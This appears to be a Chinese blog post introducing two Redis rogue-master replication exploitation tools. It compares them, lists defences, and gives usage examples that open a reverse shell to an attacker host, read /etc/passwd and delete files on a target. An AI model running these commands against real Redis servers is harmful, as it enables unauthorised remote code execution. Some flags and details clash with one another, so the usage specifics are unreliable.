---
layout: post
title: "工具介绍Awsome-Redis-Rogue-Server-与-redis-rogue-server"
date: 2025-03-14 10:02:58 +0800
description: "基于Redis主从复制漏洞（CVE未公开），针对Redis 4.x-5.x版本设计，通过伪造恶意主节点强制同步恶意模块（在原版基础上优化，支持更复杂的Redis认证场景（如存在密码保护的实例），并修复部分兼容性问题。更适合快速测试未授权场景。防御需结合访问控制、日志监控与版本升级，避免恶意模块加载和横向渗透。两者均利用Redis主从复制的设计缺陷实现RCE，但。文件）实现远程代码执行（RCE）。更适用于复杂认证环境，而。"
keywords: "工具介绍《Awsome-Redis-Rogue-Server 与 redis-rogue-server》"
categories: ['未分类']
tags: ['网络', '安全', 'Web', 'Redis']
artid: "146250243"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146250243
    alt: "工具介绍Awsome-Redis-Rogue-Server-与-redis-rogue-server"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146250243
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146250243
cover: https://bing.ee123.net/img/rand?artid=146250243
image: https://bing.ee123.net/img/rand?artid=146250243
img: https://bing.ee123.net/img/rand?artid=146250243
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     工具介绍《Awsome-Redis-Rogue-Server 与 redis-rogue-server》
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-atom-one-dark" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <h4>
     <a id="1__1">
     </a>
     <strong>
      1. 核心功能与攻击场景
     </strong>
    </h4>
    <ul>
     <li>
      <p>
       <strong>
        redis-rogue-server
       </strong>
       <br/>
       基于Redis主从复制漏洞（CVE未公开），针对Redis 4.x~5.0.5版本设计，通过伪造恶意主节点强制同步恶意模块（
       <code>
        .so
       </code>
       文件）实现远程代码执行（RCE）。
      </p>
      <ul>
       <li>
        <strong>
         适用场景
        </strong>
        ：
        <ul>
         <li>
          <strong>
           主动模式
          </strong>
          ：攻击外网暴露的未授权Redis或已知弱密码的实例，直接建立主从关系。
         </li>
         <li>
          <strong>
           被动模式
          </strong>
          ：通过SSRF或内网横向移动，诱导目标Redis反向连接攻击者控制的恶意主节点。
         </li>
        </ul>
       </li>
       <li>
        <strong>
         技术特点
        </strong>
        ：
        <ul>
         <li>
          内置编译好的恶意模块（如
          <code>
           exp.so
          </code>
          ），支持生成反弹Shell或执行系统命令。
         </li>
         <li>
          支持交互式Shell（直接命令执行）或反向Shell（绕过防火墙限制）。
         </li>
        </ul>
       </li>
      </ul>
     </li>
     <li>
      <p>
       <strong>
        Awsome-Redis-Rogue-Server
       </strong>
       <br/>
       在原版基础上优化，支持更复杂的Redis认证场景（如存在密码保护的实例），并修复部分兼容性问题。
      </p>
      <ul>
       <li>
        <strong>
         核心改进
        </strong>
        ：
        <ul>
         <li>
          增加对密码认证Redis实例的利用能力，通过
          <code>
           --passwd
          </code>
          参数指定密码。
         </li>
         <li>
          优化模块加载逻辑，减少因网络波动导致的同步失败。
         </li>
        </ul>
       </li>
       <li>
        <strong>
         应用场景
        </strong>
        ：
        <ul>
         <li>
          针对企业内网中配置了密码但未限制主从复制的Redis实例。
         </li>
         <li>
          结合Redis横向渗透工具（如
          <code>
           RedisScanner
          </code>
          ）批量探测并攻击。
         </li>
        </ul>
       </li>
      </ul>
     </li>
    </ul>
    <h4>
     <a id="2__20">
     </a>
     <strong>
      2. 使用流程与工具差异
     </strong>
    </h4>
    <table>
     <thead>
      <tr>
       <th>
        <strong>
         对比项
        </strong>
       </th>
       <th>
        <strong>
         redis-rogue-server
        </strong>
       </th>
       <th>
        <strong>
         Awsome-Redis-Rogue-Server
        </strong>
       </th>
      </tr>
     </thead>
     <tbody>
      <tr>
       <td>
        <strong>
         依赖文件
        </strong>
       </td>
       <td>
        需预编译
        <code>
         .so
        </code>
        模块（或使用自带
        <code>
         exp.so
        </code>
        ）
       </td>
       <td>
        同左，但优化模块兼容性
       </td>
      </tr>
      <tr>
       <td>
        <strong>
         密码支持
        </strong>
       </td>
       <td>
        有限支持（需手动修改代码或参数）
       </td>
       <td>
        原生支持
        <code>
         --passwd
        </code>
        参数指定密码
       </td>
      </tr>
      <tr>
       <td>
        <strong>
         攻击模式
        </strong>
       </td>
       <td>
        主动/被动模式
       </td>
       <td>
        同左，增加对认证流程的自动化处理
       </td>
      </tr>
      <tr>
       <td>
        <strong>
         适用Redis版本
        </strong>
       </td>
       <td>
        4.x-5.0.5
       </td>
       <td>
        扩展至部分5.0.5+版本（需测试）
       </td>
      </tr>
      <tr>
       <td>
        <strong>
         典型命令
        </strong>
       </td>
       <td>
        <code>
         python3 redis-rogue-server.py --rhost &lt;目标IP&gt;
        </code>
       </td>
       <td>
        <code>
         python3 redis_rogue_server.py -rhost &lt;目标IP&gt; -passwd &lt;密码&gt;
        </code>
       </td>
      </tr>
     </tbody>
    </table>
    <h4>
     <a id="3__29">
     </a>
     <strong>
      3. 防御建议与漏洞修复
     </strong>
    </h4>
    <ul>
     <li>
      <strong>
       禁用高危命令
      </strong>
      ：通过
      <code>
       rename-command
      </code>
      重命名或禁用
      <code>
       MODULE
      </code>
      、
      <code>
       SLAVEOF
      </code>
      等指令。
     </li>
     <li>
      <strong>
       强制认证
      </strong>
      ：设置
      <code>
       requirepass
      </code>
      强密码，并启用
      <code>
       masterauth
      </code>
      保证主从通信安全。
     </li>
     <li>
      <strong>
       网络隔离
      </strong>
      ：限制Redis端口仅对可信IP开放，避免暴露公网。
     </li>
     <li>
      <strong>
       升级修复
      </strong>
      ：升级至Redis 7.4.2+/7.2.7+修复Lua引擎漏洞（如CVE-2024-46981）。
     </li>
    </ul>
    <h4>
     <a id="_35">
     </a>
     <strong>
      总结
     </strong>
    </h4>
    <p>
     两者均利用Redis主从复制的设计缺陷实现RCE，但
     <strong>
      Awsome-Redis-Rogue-Server
     </strong>
     更适用于复杂认证环境，而
     <strong>
      redis-rogue-server
     </strong>
     更适合快速测试未授权场景。防御需结合访问控制、日志监控与版本升级，避免恶意模块加载和横向渗透。
    </p>
    <hr/>
    <h4>
     <a id="redis_rogue_serverpy__40">
     </a>
     <strong>
      <code>
       redis_rogue_server.py
      </code>
      参数解析
     </strong>
    </h4>
    <p>
     该文件位于
     <code>
      Awsome-Redis-Rogue-Server
     </code>
     项目中。
    </p>
    <h5>
     <a id="1__43">
     </a>
     <strong>
      1. 基本参数
     </strong>
    </h5>
    <table>
     <thead>
      <tr>
       <th>
        <strong>
         参数
        </strong>
       </th>
       <th>
        <strong>
         描述
        </strong>
       </th>
       <th>
        <strong>
         示例
        </strong>
       </th>
      </tr>
     </thead>
     <tbody>
      <tr>
       <td>
        <code>
         -rhost
        </code>
       </td>
       <td>
        目标Redis服务器的IP地址。
       </td>
       <td>
        <code>
         -rhost 192.168.1.100
        </code>
       </td>
      </tr>
      <tr>
       <td>
        <code>
         -rport
        </code>
       </td>
       <td>
        目标Redis服务器的端口（默认6379）。
       </td>
       <td>
        <code>
         -rport 6379
        </code>
       </td>
      </tr>
      <tr>
       <td>
        <code>
         -lhost
        </code>
       </td>
       <td>
        攻击者主机的IP地址（用于反向Shell或模块同步）。
       </td>
       <td>
        <code>
         -lhost 10.0.0.1
        </code>
       </td>
      </tr>
      <tr>
       <td>
        <code>
         -lport
        </code>
       </td>
       <td>
        攻击者主机的监听端口（默认15000）。
       </td>
       <td>
        <code>
         -lport 21000
        </code>
       </td>
      </tr>
      <tr>
       <td>
        <code>
         -passwd
        </code>
       </td>
       <td>
        Redis实例的认证密码（若目标Redis设置了密码）。
       </td>
       <td>
        <code>
         -passwd redis123
        </code>
       </td>
      </tr>
      <tr>
       <td>
        <code>
         -sofile
        </code>
       </td>
       <td>
        指定恶意模块文件（如
        <code>
         exp.so
        </code>
        ）。
       </td>
       <td>
        <code>
         -sofile ./exp.so
        </code>
       </td>
      </tr>
      <tr>
       <td>
        <code>
         -path
        </code>
       </td>
       <td>
        指定恶意模块文件路径（如
        <code>
         exp.so
        </code>
        ），该模块通常包含远程代码执行函数（如
        <code>
         system.exec
        </code>
        ），程序到路径中加载文件。
       </td>
       <td>
        <code>
         -path exp.so
        </code>
       </td>
      </tr>
      <tr>
       <td>
        <code>
         -v
        </code>
       </td>
       <td>
        详细输出模式，用于显示攻击过程中的调试信息，如连接状态、命令执行细节、模块加载进度等。
       </td>
       <td>
        <code>
         -v
        </code>
       </td>
      </tr>
     </tbody>
    </table>
    <h5>
     <a id="2__55">
     </a>
     <strong>
      2. 高级参数
     </strong>
    </h5>
    <table>
     <thead>
      <tr>
       <th>
        <strong>
         参数
        </strong>
       </th>
       <th>
        <strong>
         描述
        </strong>
       </th>
       <th>
        <strong>
         示例
        </strong>
       </th>
      </tr>
     </thead>
     <tbody>
      <tr>
       <td>
        <code>
         --command
        </code>
       </td>
       <td>
        直接执行系统命令（无需加载模块）。
       </td>
       <td>
        <code>
         --command "id"
        </code>
       </td>
      </tr>
      <tr>
       <td>
        <code>
         --function
        </code>
       </td>
       <td>
        调用模块中的特定函数（如
        <code>
         system.exec
        </code>
        ）。
       </td>
       <td>
        <code>
         --function system.exec
        </code>
       </td>
      </tr>
      <tr>
       <td>
        <code>
         --backupfile
        </code>
       </td>
       <td>
        指定目标Redis持久化文件的备份路径（用于恢复数据）。
       </td>
       <td>
        <code>
         --backupfile /tmp/dump.rdb
        </code>
       </td>
      </tr>
      <tr>
       <td>
        <code>
         --interactive
        </code>
       </td>
       <td>
        启用交互式Shell（加载模块后）。
       </td>
       <td>
        <code>
         --interactive
        </code>
       </td>
      </tr>
     </tbody>
    </table>
    <h5>
     <a id="3__63">
     </a>
     <strong>
      3. 使用示例
     </strong>
    </h5>
    <pre><code class="prism language-bash"><span class="token comment"># 主动模式（外网/已知密码）:加载 exp.so 模块，获取交互式 </span>
<span class="token comment"># 功能：通过主从复制加载恶意模块，直接进入交互式 Shell。</span>
<span class="token comment"># 场景：外网 Redis 未授权或已知弱密码。</span>
Shell python3 redis_rogue_server.py <span class="token parameter variable">-rhost</span> <span class="token number">192.168</span>.1.100 <span class="token parameter variable">-lhost</span> <span class="token number">10.0</span>.0.1 <span class="token parameter variable">-passwd</span> redis123 <span class="token parameter variable">-sofile</span> exp.so <span class="token parameter variable">--interactive</span>


<span class="token comment"># 被动模式（内网/SSRF诱导）:仅启动恶意主节点，等待目标 Redis 反向连接 </span>
<span class="token comment"># 功能：通过 SSRF 或内网横向移动诱导目标 Redis 连接恶意主节点。</span>
<span class="token comment"># 场景：目标 Redis 处于内网且无法直接访问。</span>
python3 redis_rogue_server.py --server-only <span class="token parameter variable">-lhost</span> <span class="token number">10.0</span>.0.1 <span class="token parameter variable">-lport</span> <span class="token number">21000</span>


<span class="token comment"># 反向 Shell 反弹:监听 4444 端口，触发目标反弹 Shell </span>
<span class="token comment"># 功能：利用模块中的 `system.rev` 函数建立反向 Shell。</span>
<span class="token comment"># 场景：绕过防火墙限制或权限维持。</span>
python3 redis_rogue_server.py <span class="token parameter variable">-rhost</span> <span class="token number">192.168</span>.1.100 <span class="token parameter variable">-lhost</span> <span class="token number">10.0</span>.0.1 <span class="token parameter variable">-lport</span> <span class="token number">4444</span> <span class="token parameter variable">-sofile</span> exp.so <span class="token parameter variable">--function</span> system.rev


<span class="token comment"># 快速命令执行:直接执行系统命令（无需加载模块）</span>
<span class="token comment"># 功能：快速验证漏洞或执行单条命令。</span>
<span class="token comment"># 场景：应急响应或自动化渗透测试。</span>
python3 redis_rogue_server.py <span class="token parameter variable">-rhost</span> <span class="token number">192.168</span>.1.100 <span class="token parameter variable">-command</span> <span class="token string">"cat /etc/passwd"</span>


<span class="token comment"># 调用自定义模块的特定函数：</span>
<span class="token comment"># 说明：适用于绕过 WAF 或实现隐蔽攻击。</span>
python3 redis_rogue_server.py <span class="token parameter variable">-rhost</span> <span class="token number">192.168</span>.1.100 <span class="token parameter variable">-sofile</span> custom.so <span class="token parameter variable">--function</span> custom_cmd <span class="token parameter variable">--command</span> <span class="token string">"rm -f /tmp/lock"</span>


<span class="token comment"># 攻击前备份目标 Redis 数据 </span>
<span class="token comment"># 说明：避免攻击导致业务中断，需提前验证备份文件完整性。</span>
python3 redis_rogue_server.py <span class="token parameter variable">-rhost</span> <span class="token number">192.168</span>.1.100 <span class="token parameter variable">--backupfile</span> /tmp/dump.rdb
</code></pre>
    <h5>
     <a id="4__101">
     </a>
     <strong>
      4. 注意事项
     </strong>
    </h5>
    <ul>
     <li>
      <strong>
       恶意模块
      </strong>
      ：
      <code>
       exp.so
      </code>
      需提前编译，包含
      <code>
       system.exec
      </code>
      等函数。
     </li>
     <li>
      <strong>
       网络权限
      </strong>
      ：确保攻击者主机（
      <code>
       lhost
      </code>
      ）可被目标Redis访问（用于反向Shell或模块同步）。
     </li>
     <li>
      <strong>
       数据备份
      </strong>
      ：攻击前建议备份目标Redis数据（
      <code>
       --backupfile
      </code>
      ），避免数据丢失。
     </li>
    </ul>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f2f62:6c6f672e6373646e2e6e65742f71715f34363134333333392f:61727469636c652f64657461696c732f313436323530323433" class_="artid" style="display:none">
 </p>
</div>


